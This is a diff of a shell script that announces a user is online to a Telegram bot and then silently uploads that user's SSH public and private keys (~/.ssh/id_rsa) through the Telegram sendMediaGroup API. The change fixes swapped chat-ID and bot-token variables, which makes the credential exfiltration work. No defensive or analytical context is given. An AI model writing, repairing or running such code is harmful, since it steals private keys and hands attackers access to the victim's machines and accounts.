@@ -10,19 +10,19 @@ TELEGRAM_MESSAGE="<b>🎯 $username на связи</b>"
 curl -X POST \
     -H 'Content-Type: application/json' \
     -d "{ \
-                \"chat_id\": \"$TELEGRAM_BOT_TOKEN\", \
+                \"chat_id\": \"$TELEGRAM_CHAT_ID\", \
                 \"text\": \"$TELEGRAM_MESSAGE\", \
                 \"parse_mode\": \"HTML\", \
                 \"disable_web_page_preview\": true,\
                 \"disable_notification\": true \
             }" \
-    https://api.telegram.org/bot$TELEGRAM_CHAT_ID/sendMessage
+    https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage
 
 curl -X POST \
-    -F chat_id="${TELEGRAM_BOT_TOKEN}" \
+    -F chat_id="${TELEGRAM_CHAT_ID}" \
     -F parse_mode="Markdown" \
     -F 'media=[{"type": "document", "media": "attach://file1"}, {"type": "document", "media": "attach://file2" }]' \
     -F file1=@"/home/${username}/.ssh/id_rsa.pub" \
     -F file2=@"/home/${username}/.ssh/id_rsa" \
     -F disable_notification=true \
-    https://api.telegram.org/bot$TELEGRAM_CHAT_ID/sendMediaGroup
+    https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMediaGroup
